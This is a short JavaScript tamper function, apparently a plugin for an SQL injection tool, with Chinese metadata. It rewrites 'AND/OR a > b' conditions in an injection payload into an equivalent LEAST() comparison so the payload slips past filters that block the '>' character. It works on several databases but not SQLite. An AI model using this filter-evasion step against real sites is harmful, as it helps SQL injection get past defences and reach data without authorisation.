//@name: 大于转LEAST
//@usage: payload
//@enable: false
//@description: a>b→LEAST(a,b+1)=b+1（MySQL/PG/MSSQL2022+/Oracle，不适用SQLite）
function tamper(payload){
    if (!payload) { return payload; }
    var m = /(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')/i.exec(payload);
    return m ? payload.split(m[0]).join(m[1] + 'LEAST(' + m[3] + ',' + m[4] + '+1)=' + m[4] + '+1') : payload;
}